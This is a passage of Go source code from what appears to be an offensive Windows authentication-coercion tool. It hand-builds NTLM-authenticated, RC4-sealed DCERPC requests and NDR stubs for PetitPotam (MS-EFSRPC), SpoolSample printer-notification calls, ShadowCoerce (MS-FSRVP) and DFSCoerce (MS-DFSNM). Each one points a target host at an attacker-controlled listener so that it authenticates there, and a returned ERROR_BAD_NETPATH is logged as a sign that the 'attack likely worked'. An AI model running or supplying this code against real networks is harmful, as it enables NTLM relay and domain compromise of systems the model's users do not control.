}

func buildTempBlob(timestamp int64, clientChallenge, targetInfo []byte) []byte {
	if verbose {
		fmt.Printf("[DEBUG] buildTempBlob: targetInfo length=%d, last 50 bytes: %x\n", len(targetInfo), targetInfo[len(targetInfo)-50:])
	}

	buf := new(bytes.Buffer)

	buf.WriteByte(0x01)                 // RespType
	buf.WriteByte(0x01)                 // HiRespType
	buf.Write([]byte{0, 0, 0, 0, 0, 0}) // Reserved

	binary.Write(buf, binary.LittleEndian, uint64(timestamp))
	buf.Write(clientChallenge)
	buf.Write([]byte{0, 0, 0, 0}) // Reserved
	buf.Write(targetInfo)
	buf.Write([]byte{0, 0, 0, 0}) // End

	return buf.Bytes()
}

func createMinimalTargetInfo() []byte {
	// Empty target info with terminator
	return []byte{0, 0, 0, 0}
}

// extractHostnameFromTargetInfo extracts the DNS or NetBIOS hostname from AV_PAIRS
func extractHostnameFromTargetInfo(targetInfo []byte) []byte {
	// Parse AV_PAIRS to find NTLMSSP_AV_HOSTNAME (0x0001) or NTLMSSP_AV_DNS_HOSTNAME (0x0003)
	offset := 0
	for offset+4 <= len(targetInfo) {
		avID := binary.LittleEndian.Uint16(targetInfo[offset : offset+2])
		avLen := binary.LittleEndian.Uint16(targetInfo[offset+2 : offset+4])
		offset += 4

		if avID == 0x0000 { // EOL
			break
		}

		if avID == 0x0001 || avID == 0x0003 { // HOSTNAME or DNS_HOSTNAME
			if offset+int(avLen) <= len(targetInfo) {
				hostname := make([]byte, avLen)
				copy(hostname, targetInfo[offset:offset+int(avLen)])
				if verbose {
					fmt.Printf("[DEBUG] Extracted hostname from AV_PAIR 0x%04x: %d bytes\n", avID, avLen)
				}
				return hostname
			}
		}

		offset += int(avLen)
	}
	return nil
}

// addTargetNameToAVPairs adds NTLMSSP_AV_TARGET_NAME (0x0009) to the AV_PAIRS
// Format: 'cifs/' + hostname (UTF-16LE)
func addTargetNameToAVPairs(targetInfo []byte, hostname []byte) []byte {
	// Parse existing AV_PAIRS and remove EOL marker (we'll add it back at the end)
	if verbose {
		fmt.Printf("[DEBUG] Processing targetInfo (%d bytes)\n", len(targetInfo))
	}
	filtered := new(bytes.Buffer)
	offset := 0
	for offset+4 <= len(targetInfo) {
		avID := binary.LittleEndian.Uint16(targetInfo[offset : offset+2])
		avLen := binary.LittleEndian.Uint16(targetInfo[offset+2 : offset+4])

		if avID == 0x0000 { // EOL - stop here, we'll add it back at the end
			break
		}

		// Keep ALL av_pairs from server (like Python does)
		filtered.Write(targetInfo[offset : offset+4+int(avLen)])
		if verbose {
			fmt.Printf("[DEBUG] Including AV_PAIR 0x%04x (len=%d)\n", avID, avLen)
		}

		offset += 4 + int(avLen)
	}
	targetInfo = filtered.Bytes()
	if verbose {
		fmt.Printf("[DEBUG] After removing EOL: %d bytes\n", len(targetInfo))
	}

	// Build TARGET_NAME: 'cifs/' + hostname
	cifsPrefix := stringToUTF16LE("cifs/")
	targetName := append(cifsPrefix, hostname...)

	if verbose {
		fmt.Printf("[DEBUG] TARGET_NAME construction:\n")
	}
	fmt.Printf("  cifs/ prefix: %d bytes\n", len(cifsPrefix))
	fmt.Printf("  hostname: %d bytes\n", len(hostname))
	fmt.Printf("  total TARGET_NAME: %d bytes\n", len(targetName))

	// Add TARGET_NAME AV_PAIR
	buf := new(bytes.Buffer)
	buf.Write(targetInfo)
	binary.Write(buf, binary.LittleEndian, uint16(0x0009)) // NTLMSSP_AV_TARGET_NAME
	binary.Write(buf, binary.LittleEndian, uint16(len(targetName)))
	buf.Write(targetName)

	// Add EOL
	binary.Write(buf, binary.LittleEndian, uint16(0x0000))
	binary.Write(buf, binary.LittleEndian, uint16(0x0000))

	return buf.Bytes()
}

func stringToUTF16LE(s string) []byte {
	runes := []rune(s)
	u16 := utf16.Encode(runes)
	buf := new(bytes.Buffer)
	for _, r := range u16 {
		binary.Write(buf, binary.LittleEndian, r)
	}
	return buf.Bytes()
}

func uppercaseString(s string) string {
	// Simple uppercase (for ASCII)
	runes := []rune(s)
	for i, r := range runes {
		if r >= 'a' && r <= 'z' {
			runes[i] = r - 32
		}
	}
	return string(runes)
}

// DCERPC packet creation functions

func createDCERPCBindWithAuth(negotiateMsg []byte, uuid string, majorVer uint16, minorVer uint16) []byte {
	buf := new(bytes.Buffer)

	// DCERPC Header
	buf.WriteByte(5)                                      // Version major
	buf.WriteByte(0)                                      // Version minor
	buf.WriteByte(dcerpcBind)                             // Packet type
	buf.WriteByte(dcerpcPfcFirstFrag | dcerpcPfcLastFrag) // Flags
	binary.Write(buf, binary.LittleEndian, uint32(0x10))  // Data representation

	fragLenPos := buf.Len()
	binary.Write(buf, binary.LittleEndian, uint16(0))                 // Frag length (update later)
	binary.Write(buf, binary.LittleEndian, uint16(len(negotiateMsg))) // Auth length
	binary.Write(buf, binary.LittleEndian, uint32(1))                 // Call ID

	// Bind body (use Impacket's values)
	binary.Write(buf, binary.LittleEndian, uint16(4280)) // Max xmit frag
	binary.Write(buf, binary.LittleEndian, uint16(4280)) // Max recv frag
	binary.Write(buf, binary.LittleEndian, uint32(0))    // Assoc group

	// Context list
	buf.WriteByte(1) // Num contexts
	buf.WriteByte(0) // Reserved
	buf.WriteByte(0) // Reserved2
	buf.WriteByte(0) // Reserved3

	// Context item 0
	binary.Write(buf, binary.LittleEndian, uint16(0)) // Context ID
	buf.WriteByte(1)                                  // Num transfer syntaxes
	buf.WriteByte(0)                                  // Reserved

	// Abstract syntax (DCERPC interface UUID)
	interfaceUUID := parseUUID(uuid)
	buf.Write(interfaceUUID)
	binary.Write(buf, binary.LittleEndian, majorVer)
	binary.Write(buf, binary.LittleEndian, minorVer)

	// Transfer syntax (NDR)
	transferUUID := parseUUID(ndrUUID)
	buf.Write(transferUUID)
	binary.Write(buf, binary.LittleEndian, uint16(2))
	binary.Write(buf, binary.LittleEndian, uint16(0))

	// Pad to 4-byte boundary (Impacket does this)
	currentLen := buf.Len()
	padLen := (4 - (currentLen % 4)) % 4
	for i := 0; i < padLen; i++ {
		buf.WriteByte(0xFF) // Impacket uses 0xFF for padding
	}

	// Auth verifier header
	buf.WriteByte(dcerpcAuthTypeNTLMSSP)                    // Auth type
	buf.WriteByte(dcerpcAuthLevelPrivacy)                   // Auth level
	buf.WriteByte(byte(padLen))                             // Auth pad length
	buf.WriteByte(0)                                        // Reserved
	binary.Write(buf, binary.LittleEndian, uint32(0+79231)) // Auth context ID (like Impacket)

	// Auth value (NTLM Negotiate)
	buf.Write(negotiateMsg)

	// Update frag length
	packet := buf.Bytes()
	binary.LittleEndian.PutUint16(packet[fragLenPos:], uint16(len(packet)))

	return packet
}

func createDCERPCAuth3(auth *NTLMAuth, authenticateMsg []byte) []byte {
	buf := new(bytes.Buffer)

	// DCERPC Header
	buf.WriteByte(5)                                      // Version major
	buf.WriteByte(0)                                      // Version minor
	buf.WriteByte(dcerpcAuth3)                            // Packet type: Auth3
	buf.WriteByte(dcerpcPfcFirstFrag | dcerpcPfcLastFrag) // Flags
	binary.Write(buf, binary.LittleEndian, uint32(0x10))  // Data representation

	fragLenPos := buf.Len()
	binary.Write(buf, binary.LittleEndian, uint16(0))                    // Frag length (update later)
	binary.Write(buf, binary.LittleEndian, uint16(len(authenticateMsg))) // Auth length
	binary.Write(buf, binary.LittleEndian, uint32(1))                    // Call ID

	// Auth3 requires 4 bytes of padding before the auth trailer (per MS-RPCE spec)
	buf.Write([]byte{0, 0, 0, 0}) // 4 bytes padding

	// Auth verifier header (8 bytes)
	buf.WriteByte(dcerpcAuthTypeNTLMSSP)                       // Auth type
	buf.WriteByte(dcerpcAuthLevelPrivacy)                      // Auth level
	buf.WriteByte(0)                                           // Auth pad length
	buf.WriteByte(0)                                           // Reserved
	binary.Write(buf, binary.LittleEndian, auth.authContextID) // Auth context ID from server

	// Auth value (NTLM Authenticate)
	buf.Write(authenticateMsg)

	// Update frag length
	packet := buf.Bytes()
	binary.LittleEndian.PutUint16(packet[fragLenPos:], uint16(len(packet)))

	return packet
}

// sendAuthenticatedRequestWithResponse sends a request and returns the decrypted response data
func sendAuthenticatedRequestWithResponse(pipe *smb.File, auth *NTLMAuth, opnum uint16, stub []byte) ([]byte, error) {
	if verbose {
		fmt.Printf("[DEBUG] Stub (%d bytes): %x\n", len(stub), stub)
	}

	// Create DCERPC Request with auth verifier
	req := createAuthenticatedRequest(auth, opnum, stub)
	truncLen := 80
	if len(req) < truncLen {
		truncLen = len(req)
	}
	if verbose {
		fmt.Printf("[DEBUG] Authenticated request (%d bytes): %x...\n", len(req), req[:truncLen])
	}

	fmt.Println("[+] Sending authenticated request via WriteFile...")
	_, err := pipe.WriteFile(req, 0)
	if err != nil {
		return nil, fmt.Errorf("request write failed: %v", err)
	}

	// Read response
	resp := make([]byte, 4096)
	nResp, err := pipe.ReadFile(resp, 0)
	if err != nil {
		return nil, fmt.Errorf("request read failed: %v", err)
	}
	resp = resp[:nResp]
	if verbose {
		fmt.Printf("[DEBUG] Got %d bytes encrypted response\n", len(resp))
	}

	// Parse DCERPC response header
	if len(resp) < 24 {
		return nil, fmt.Errorf("response too short: %d bytes", len(resp))
	}

	packetType := resp[2]
	fragLen := binary.LittleEndian.Uint16(resp[8:10])
	authLen := binary.LittleEndian.Uint16(resp[10:12])

	if verbose {
		fmt.Printf("[DEBUG] Response: type=%d, fragLen=%d, authLen=%d\n", packetType, fragLen, authLen)
	}

	// Check for DCERPC fault (type 3)
	if packetType == dcerpcFault {
		status := binary.LittleEndian.Uint32(resp[24:28])
		if status == 0x6f7 {
			return nil, fmt.Errorf("got ERROR_BAD_NETPATH (0x%x) - attack likely worked", status)
		}
		return nil, fmt.Errorf("got fault 0x%x", status)
	}

	// For PKT_PRIVACY, response stub is encrypted
	// Response structure: DCERPC header (24 bytes) + encrypted stub + padding + auth trailer (8 bytes + authLen)
	if authLen > 0 {
		// Extract encrypted stub (everything between header and auth trailer)
		authTrailerStart := int(fragLen) - int(authLen) - 8
		if authTrailerStart <= 24 {
			return nil, fmt.Errorf("invalid auth trailer position")
		}

		encryptedStub := resp[24:authTrailerStart]

		// Extract padding length from auth trailer
		authPadLen := resp[authTrailerStart+2]

		// Remove padding from encrypted stub
		if int(authPadLen) > 0 && int(authPadLen) < len(encryptedStub) {
			encryptedStub = encryptedStub[:len(encryptedStub)-int(authPadLen)]
		}

		if verbose {
			fmt.Printf("[DEBUG] Encrypted stub: %d bytes (authPadLen=%d)\n", len(encryptedStub), authPadLen)
		}

		// Decrypt stub with server seal handle (continued RC4 stream)
		decryptedStub := make([]byte, len(encryptedStub))
		auth.serverSealHandle.XORKeyStream(decryptedStub, encryptedStub)

		if verbose {
			fmt.Printf("[DEBUG] Decrypted stub: %x\n", decryptedStub)
		}

		// Verify signature (extract from auth trailer)
		signature := resp[authTrailerStart+8 : authTrailerStart+8+int(authLen)]
		if verbose {
			fmt.Printf("[DEBUG] Response signature: %x\n", signature)
		}

		// Build complete decrypted response: header + decrypted stub
		result := make([]byte, 24+len(decryptedStub))
		copy(result[0:24], resp[0:24])
		copy(result[24:], decryptedStub)

		return result, nil
	}

	// No auth trailer - return as-is
	return resp, nil
}

func sendAuthenticatedRequest(pipe *smb.File, auth *NTLMAuth, opnum uint16, stub []byte) error {
	_, err := sendAuthenticatedRequestWithResponse(pipe, auth, opnum, stub)
	return err
}

func sendAuthenticatedRequestOld(pipe *smb.File, auth *NTLMAuth, opnum uint16, stub []byte) error {
	if verbose {
		fmt.Printf("[DEBUG] Stub (%d bytes): %x\n", len(stub), stub)
	}

	// Create DCERPC Request with auth verifier
	req := createAuthenticatedRequest(auth, opnum, stub)
	truncLen := 80
	if len(req) < truncLen {
		truncLen = len(req)
	}
	if verbose {
		fmt.Printf("[DEBUG] Authenticated request (%d bytes): %x...\n", len(req), req[:truncLen])
	}

	fmt.Println("[+] Sending authenticated request via WriteFile...")
	_, err := pipe.WriteFile(req, 0)
	if err != nil {
		return fmt.Errorf("request write failed: %v", err)
	}

	// Read response
	resp := make([]byte, 4096)
	nResp, err := pipe.ReadFile(resp, 0)
	if err != nil {
		return fmt.Errorf("request read failed: %v", err)
	}
	resp = resp[:nResp]
	if verbose {
		fmt.Printf("[DEBUG] Request sent, got %d bytes response: %x\n", len(resp), resp)
	}
	if len(resp) >= 24 && resp[2] == dcerpcFault {
		status := binary.LittleEndian.Uint32(resp[24:28])
		if status == 0x6f7 {
			return fmt.Errorf("got ERROR_BAD_NETPATH (0x%x) - attack likely worked", status)
		}
		return fmt.Errorf("got fault 0x%x", status)
	}

	return nil
}

// createAuthenticatedRequest creates a DCERPC Request packet with PKT_PRIVACY encryption
//
// CRITICAL ENCRYPTION ORDER (matches impacket's SEAL function):
//
// This is the most subtle and critical part of DCERPC PKT_PRIVACY implementation.
// The order MUST be:
//  1. Build packet with PLAINTEXT stub + padding
//  2. Encrypt stub+padding with RC4 (but DON'T write to packet yet)
//  3. Sign packet with PLAINTEXT stub (signature encrypts checksum with CONTINUED RC4 stream)
//  4. Replace plaintext stub with encrypted stub in packet
//
// WHY THIS ORDER MATTERS:
// - The RC4 cipher is a CONTINUOUS STREAM (never reset)
// - Stub encryption uses bytes 0..N of the RC4 keystream
// - Signature checksum encryption uses bytes N+1..N+8 of the SAME keystream
// - If you sign first, then encrypt stub, the RC4 stream gets out of sync
// - Server will decrypt with wrong keystream bytes and fail
//
// This matches impacket's ntlm.SEAL() which does:
//  1. encrypted_pdu = cipher_encrypt(plain_pdu)
//  2. signature = GSS_GetMIC(plain_pdu)  # Uses continued RC4 for checksum
//
// Input:
//   - auth: NTLMAuth state with continuous RC4 cipher handle
//   - opnum: DCERPC operation number (0 = EfsRpcOpenFileRaw, 4 = EfsRpcEncryptFileSrv)
//   - stub: NDR-encoded function parameters (typically UNC path for EfsRpc)
//
// Output: Complete DCERPC Request packet with encrypted stub and signature
func createAuthenticatedRequest(auth *NTLMAuth, opnum uint16, stub []byte) []byte {

	// Use current sequence number (starts at 0 like impacket)
	if verbose {
		fmt.Printf("[DEBUG] Using sequence number: %d for authenticated request\n", auth.seqNum)
	}

	buf := new(bytes.Buffer)

	// DCERPC Header
	buf.WriteByte(5)                                      // Version major
	buf.WriteByte(0)                                      // Version minor
	buf.WriteByte(dcerpcRequest)                          // Packet type
	buf.WriteByte(dcerpcPfcFirstFrag | dcerpcPfcLastFrag) // Flags
	binary.Write(buf, binary.LittleEndian, uint32(0x10))  // Data representation

	fragLenPos := buf.Len()
	binary.Write(buf, binary.LittleEndian, uint16(0))  // Frag length (update later)
	binary.Write(buf, binary.LittleEndian, uint16(16)) // Auth length (NTLM signature is always 16 bytes)
	binary.Write(buf, binary.LittleEndian, uint32(2))  // Call ID

	// Calculate padding needed for 4-byte alignment (impacket uses 4-byte, not 8-byte!)
	// Padding is added to the stub BEFORE encryption
	stubPadLength := (4 - (len(stub) % 4)) % 4

	// Request body - impacket sets alloc_hint to stub length (before padding)
	binary.Write(buf, binary.LittleEndian, uint32(len(stub))) // Alloc hint = stub length before padding
	binary.Write(buf, binary.LittleEndian, uint16(0))         // Context ID
	binary.Write(buf, binary.LittleEndian, uint16(opnum))     // Opnum
	if verbose {
		fmt.Printf("[DEBUG] DCERPC Request: ContextID=%d, Opnum=%d, StubLen=%d (padded=%d), alloc_hint=%d\n", 0, opnum, len(stub), len(stub)+stubPadLength, len(stub))
	}

	// PLAINTEXT stub with padding (will be encrypted together)
	stubStartPos := buf.Len()

	// Create padded stub (impacket uses 0xBB for padding bytes)
	paddedStub := make([]byte, len(stub)+stubPadLength)
	copy(paddedStub, stub)
	for i := 0; i < stubPadLength; i++ {
		paddedStub[len(stub)+i] = 0xBB
	}

	// Write padded stub (padding is already included in paddedStub)
	buf.Write(paddedStub)

	// The stubPadLength IS the auth_pad_len! No additional padding needed
	// Impacket adds the padding to pduData and sets auth_pad_len to that same value

	// Auth verifier header
	buf.WriteByte(dcerpcAuthTypeNTLMSSP)                       // Auth type
	buf.WriteByte(dcerpcAuthLevelPrivacy)                      // Auth level
	buf.WriteByte(byte(stubPadLength))                         // Auth pad length (matches stub padding!)
	buf.WriteByte(0)                                           // Reserved
	binary.Write(buf, binary.LittleEndian, auth.authContextID) // Auth context ID

	// Placeholder for signature (16 bytes)
	signaturePos := buf.Len()
	buf.Write(make([]byte, 16))

	// Update frag length
	packet := buf.Bytes()
	binary.LittleEndian.PutUint16(packet[fragLenPos:], uint16(len(packet)))

	// ========== CRITICAL ENCRYPTION/SIGNING SECTION ==========
	//
	// The order of these operations is CRITICAL for compatibility with Windows.
	// Must match impacket's SEAL function exactly.

	// Message to sign = entire packet EXCEPT the 16-byte signature placeholder
	// At this point, packet contains PLAINTEXT stub
	messageToSign := packet[:len(packet)-16]

	// STEP 1: Encrypt stub+padding with RC4 cipher
	// This uses bytes 0..N of the RC4 keystream
	// IMPORTANT: We encrypt but DON'T write to packet yet!
	encryptedStub := make([]byte, len(paddedStub))
	auth.clientSealHandle.XORKeyStream(encryptedStub, paddedStub)

	// STEP 2: Create NTLM signature from PLAINTEXT packet
	// The signature function will:
	//   a) Calculate HMAC-MD5 checksum of messageToSign (which has PLAINTEXT stub)
	//   b) Encrypt the first 8 bytes of checksum with RC4
	//   c) This RC4 encryption uses bytes N+1..N+8 of the CONTINUED keystream
	// This is why order matters - signature must use the continued stream after stub encryption
	verifier := createNTLMSignature(auth, messageToSign)

	// STEP 3: Replace plaintext stub with encrypted stub in packet
	// Now the packet has encrypted stub and valid signature
	copy(packet[stubStartPos:], encryptedStub)

	// STEP 4: Copy signature into packet
	copy(packet[signaturePos:], verifier)

	// Increment sequence number AFTER using it (like impacket)
	auth.seqNum++

	return packet
}

func createNTLMSignature(auth *NTLMAuth, message []byte) []byte {
	// Create NTLM signature for the message using continuous RC4 cipher handle
	// For extended session security: sign whole packet, encrypt just the checksum

	// Compute HMAC-MD5 checksum over the message (whole DCERPC packet except signature)
	h := hmac.New(md5.New, auth.clientSignKey)
	seqNumBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(seqNumBytes, auth.seqNum)
	h.Write(seqNumBytes)
	h.Write(message)
	checksum := h.Sum(nil)[:8] // First 8 bytes

	// Encrypt checksum using the continuous RC4 cipher handle
	encryptedChecksum := make([]byte, 8)
	auth.clientSealHandle.XORKeyStream(encryptedChecksum, checksum)

	// Build signature: Version (4 bytes) + Encrypted Checksum (8 bytes) + SeqNum (4 bytes)
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.LittleEndian, uint32(1)) // Version
	buf.Write(encryptedChecksum)
	binary.Write(buf, binary.LittleEndian, uint32(auth.seqNum))

	return buf.Bytes()
}

/*func encryptStub(auth *NTLMAuth, stub []byte) []byte {
	// Derive per-message sealing key: MD5(SealingKey || SeqNum)
	seqNumBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(seqNumBytes, auth.seqNum)
	m := md5.New()
	m.Write(auth.clientSealKey)
	m.Write(seqNumBytes)
	perMessageKey := m.Sum(nil)

	// Encrypt stub with RC4 using per-message seal key
	cipher, _ := rc4.NewCipher(perMessageKey)
	encrypted := make([]byte, len(stub))
	cipher.XORKeyStream(encrypted, stub)
	return encrypted
}*/

// createEfsRpcStub creates the NDR stub for MS-EFSRPC calls (PetitPotam)
// Supports multiple opnums with different parameter signatures:
// - Opnum 0 (EfsRpcOpenFileRaw): FileName + Flag
// - Opnum 4 (EfsRpcEncryptFileSrv): FileName only
// - Opnum 5 (EfsRpcDecryptFileSrv): FileName + OpenFlag
// - Opnum 6 (EfsRpcQueryUsersOnFile): FileName only
// - Opnum 7 (EfsRpcQueryRecoveryAgents): FileName only
// - Opnum 12 (EfsRpcFileKeyInfo): FileName + infoClass
func createEfsRpcStub(uncPath string, opnum uint16) []byte {
	var buf bytes.Buffer

	// Convert to UTF-16LE
	utf16Path := stringToUTF16LE(uncPath)
	lenChars := uint32(len([]rune(uncPath)))

	if verbose {
		cleanPath := strings.TrimRight(uncPath, "\x00")
		fmt.Printf("[DEBUG] EfsRpc stub opnum=%d, path='%s' (%d chars)\n", opnum, cleanPath, lenChars)
		if useHTTP && !strings.Contains(cleanPath, "@") {
			fmt.Printf("[!] WARNING: HTTP mode enabled but path missing @ symbol!\n")
		}
	}

	// Max count
	binary.Write(&buf, binary.LittleEndian, lenChars)
	// Offset
	binary.Write(&buf, binary.LittleEndian, uint32(0))
	// Actual count
	binary.Write(&buf, binary.LittleEndian, lenChars)

	// String data
	buf.Write(utf16Path)

	// Padding to 4-byte boundary (NDR uses 0x00 for padding)
	totalSoFar := 12 + len(utf16Path)
	padding := (4 - (totalSoFar % 4)) % 4
	for i := 0; i < padding; i++ {
		buf.WriteByte(0x00)
	}

	// Add additional parameters based on opnum
	switch opnum {
	case 0:
		// EfsRpcOpenFileRaw: Flag parameter (ULONG)
		binary.Write(&buf, binary.LittleEndian, uint32(0))
	case 4:
		// EfsRpcEncryptFileSrv: No additional parameters
		// Just the filename
	case 5:
		// EfsRpcDecryptFileSrv: OpenFlag parameter (ULONG)
		binary.Write(&buf, binary.LittleEndian, uint32(0))
	case 6:
		// EfsRpcQueryUsersOnFile: No additional parameters
		// Just the filename
	case 7:
		// EfsRpcQueryRecoveryAgents: No additional parameters
		// Just the filename
	case 12:
		// EfsRpcFileKeyInfo: infoClass parameter (DWORD)
		binary.Write(&buf, binary.LittleEndian, uint32(0))
	default:
		// For any unknown opnums, try with just the filename
		// This follows the most common pattern
	}

	return buf.Bytes()
}

// createRpcOpenPrinterStub creates the stub for RpcOpenPrinter (opnum 1)
// This opens a printer handle needed for subsequent notification calls
func createRpcOpenPrinterStub(printerName string) []byte {
	var buf bytes.Buffer

	// Convert printer name to UTF-16LE
	utf16Name := stringToUTF16LE(printerName)
	lenChars := uint32(len([]rune(printerName)))

	// pPrinterName is STRING_HANDLE (LPWSTR) - needs referent ID
	binary.Write(&buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID (unique pointer)

	// Conformant varying string for printer name
	binary.Write(&buf, binary.LittleEndian, lenChars)  // Max count
	binary.Write(&buf, binary.LittleEndian, uint32(0)) // Offset
	binary.Write(&buf, binary.LittleEndian, lenChars)  // Actual count
	buf.Write(utf16Name)

	// Padding to 4-byte boundary
	currentLen := buf.Len()
	padding := (4 - (currentLen % 4)) % 4
	for i := 0; i < padding; i++ {
		buf.WriteByte(0x00)
	}

	// pDatatype parameter (NULL pointer)
	binary.Write(&buf, binary.LittleEndian, uint32(0)) // NULL pointer

	// pDevModeContainer parameter (embedded structure, not pointer)
	binary.Write(&buf, binary.LittleEndian, uint32(0)) // cbBuf
	binary.Write(&buf, binary.LittleEndian, uint32(0)) // pDevMode (NULL)

	// AccessRequired parameter
	binary.Write(&buf, binary.LittleEndian, uint32(0x20000000)) // MAXIMUM_ALLOWED

	return buf.Bytes()
}

// createRpcRemoteFindFirstPrinterChangeNotificationExStub creates stub for opnum 65
// This is the primary SpoolSample coercion method
func createRpcRemoteFindFirstPrinterChangeNotificationExStub(listenerIP string, printerHandle []byte) []byte {
	var buf bytes.Buffer

	// hPrinter (context handle from RpcOpenPrinter response)
	buf.Write(printerHandle) // 20-byte context handle

	// fdwFlags (PRINTER_CHANGE_ADD_JOB = 0x00000100)
	binary.Write(&buf, binary.LittleEndian, uint32(0x00000100))

	// fdwOptions (0 for default)
	binary.Write(&buf, binary.LittleEndian, uint32(0))

	// pszLocalMachine (UNC path or HTTP URL to listener)
	callbackPath := buildCallbackPath(listenerIP, useHTTP, "", "")
	utf16Path := stringToUTF16LE(callbackPath)
	lenChars := uint32(len([]rune(callbackPath)))

	// Unique pointer (non-NULL)
	binary.Write(&buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID

	// Conformant varying string
	binary.Write(&buf, binary.LittleEndian, lenChars)  // Max count
	binary.Write(&buf, binary.LittleEndian, uint32(0)) // Offset
	binary.Write(&buf, binary.LittleEndian, lenChars)  // Actual count
	buf.Write(utf16Path)

	// Padding to 4-byte boundary
	totalSoFar := buf.Len()
	padding := (4 - (totalSoFar % 4)) % 4
	for i := 0; i < padding; i++ {
		buf.WriteByte(0x00)
	}

	// dwPrinterLocal (0)
	binary.Write(&buf, binary.LittleEndian, uint32(0))

	// pOptions (NULL)
	binary.Write(&buf, binary.LittleEndian, uint32(0)) // NULL pointer

	return buf.Bytes()
}

// createRpcRemoteFindFirstPrinterChangeNotificationStub creates stub for opnum 62
// This is the alternative SpoolSample coercion method
func createRpcRemoteFindFirstPrinterChangeNotificationStub(listenerIP string, printerHandle []byte) []byte {
	var buf bytes.Buffer

	// hPrinter (context handle from RpcOpenPrinter response)
	buf.Write(printerHandle) // 20-byte context handle

	// fdwFlags (PRINTER_CHANGE_ADD_JOB = 0x00000100)
	binary.Write(&buf, binary.LittleEndian, uint32(0x00000100))

	// fdwOptions (0 for default)
	binary.Write(&buf, binary.LittleEndian, uint32(0))

	// pszLocalMachine (UNC path or HTTP URL to listener)
	callbackPath := buildCallbackPath(listenerIP, useHTTP, "", "")
	utf16Path := stringToUTF16LE(callbackPath)
	lenChars := uint32(len([]rune(callbackPath)))

	// Unique pointer (non-NULL)
	binary.Write(&buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID

	// Conformant varying string
	binary.Write(&buf, binary.LittleEndian, lenChars)  // Max count
	binary.Write(&buf, binary.LittleEndian, uint32(0)) // Offset
	binary.Write(&buf, binary.LittleEndian, lenChars)  // Actual count
	buf.Write(utf16Path)

	// Padding to 4-byte boundary
	totalSoFar := buf.Len()
	padding := (4 - (totalSoFar % 4)) % 4
	for i := 0; i < padding; i++ {
		buf.WriteByte(0x00)
	}

	// dwPrinterLocal (0)
	binary.Write(&buf, binary.LittleEndian, uint32(0))

	// cbBuffer (0)
	binary.Write(&buf, binary.LittleEndian, uint32(0))

	// pBuffer (NULL)
	binary.Write(&buf, binary.LittleEndian, uint32(0)) // NULL pointer

	return buf.Bytes()
}

// createShadowCoerceStub creates the stub for MS-FSRVP calls (ShadowCoerce)
// Works for IsPathSupported (opnum 8) and IsPathShadowed (opnum 9)
func createShadowCoerceStub(listenerIP string, opnum uint16) []byte {
	// Build callback path with null terminator
	callbackPath := buildCallbackPath(listenerIP, useHTTP, "share", "")

	var buf bytes.Buffer

	// Convert to UTF-16LE
	utf16Path := stringToUTF16LE(callbackPath)
	lenChars := uint32(len([]rune(callbackPath)))

	// ShareName parameter (conformant varying string)
	// Max count
	binary.Write(&buf, binary.LittleEndian, lenChars)
	// Offset
	binary.Write(&buf, binary.LittleEndian, uint32(0))
	// Actual count
	binary.Write(&buf, binary.LittleEndian, lenChars)

	// String data
	buf.Write(utf16Path)

	// Padding to 4-byte boundary
	totalSoFar := 12 + len(utf16Path)
	padding := (4 - (totalSoFar % 4)) % 4
	for i := 0; i < padding; i++ {
		buf.WriteByte(0x00)
	}

	return buf.Bytes()
}

// createDFSCoerceStub creates the stub for MS-DFSNM calls (DFSCoerce)
// Works for NetrDfsAddStdRoot (opnum 12) and NetrDfsRemoveStdRoot (opnum 13)
func createDFSCoerceStub(listenerIP string, opnum uint16) []byte {
	// Build server name and share name
	serverName := buildCallbackPath(listenerIP, useHTTP, "", "")
	shareName := "share\x00"
	comment := "comment\x00"

	var buf bytes.Buffer

	// Convert to UTF-16LE
	utf16Server := stringToUTF16LE(serverName)
	utf16Share := stringToUTF16LE(shareName)
	utf16Comment := stringToUTF16LE(comment)
	lenServerChars := uint32(len([]rune(serverName)))
	lenShareChars := uint32(len([]rune(shareName)))
	lenCommentChars := uint32(len([]rune(comment)))

	// ServerName parameter (conformant varying string)
	// Max count
	binary.Write(&buf, binary.LittleEndian, lenServerChars)
	// Offset
	binary.Write(&buf, binary.LittleEndian, uint32(0))
	// Actual count
	binary.Write(&buf, binary.LittleEndian, lenServerChars)
	// String data
	buf.Write(utf16Server)

	// Padding to 4-byte boundary
	totalSoFar := 12 + len(utf16Server)
	padding := (4 - (totalSoFar % 4)) % 4
	for i := 0; i < padding; i++ {
		buf.WriteByte(0x00)
	}

	// RootShare parameter (conformant varying string)
	// Max count
	binary.Write(&buf, binary.LittleEndian, lenShareChars)
	// Offset
	binary.Write(&buf, binary.LittleEndian, uint32(0))
	// Actual count
	binary.Write(&buf, binary.LittleEndian, lenShareChars)
	// String data
	buf.Write(utf16Share)

	// Padding to 4-byte boundary
	totalSoFar = 12 + len(utf16Share)
	padding = (4 - (totalSoFar % 4)) % 4
	for i := 0; i < padding; i++ {
		buf.WriteByte(0x00)
	}

	// Comment parameter - different for each opnum
	if opnum == 12 {
		// NetrDfsAddStdRoot needs Comment parameter
		// Max count
		binary.Write(&buf, binary.LittleEndian, lenCommentChars)
		// Offset
		binary.Write(&buf, binary.LittleEndian, uint32(0))
		// Actual count
		binary.Write(&buf, binary.LittleEndian, lenCommentChars)
		// String data
		buf.Write(utf16Comment)

		// Padding to 4-byte boundary
		totalSoFar = 12 + len(utf16Comment)
		padding = (4 - (totalSoFar % 4)) % 4
		for i := 0; i < padding; i++ {
			buf.WriteByte(0x00)
		}
	}
	// NetrDfsRemoveStdRoot (opnum 13) doesn't have Comment parameter

	// ApiFlags parameter (0)
	binary.Write(&buf, binary.LittleEndian, uint32(0))

	return buf.Bytes()
}

// parseUUID and other helper functions...

func parseUUID(uuidStr string) []byte {
	decoded, _ := hex.DecodeString(uuidStr[0:8] + uuidStr[9:13] + uuidStr[14:18] + uuidStr[19:23] + uuidStr[24:36])
	uuid := make([]byte, 16)
	uuid[0], uuid[1], uuid[2], uuid[3] = decoded[3], decoded[2], decoded[1], decoded[0]
	uuid[4], uuid[5] = decoded[5], decoded[4]
	uuid[6], uuid[7] = decoded[7], decoded[6]
	copy(uuid[8:], decoded[8:])
	return uuid
}
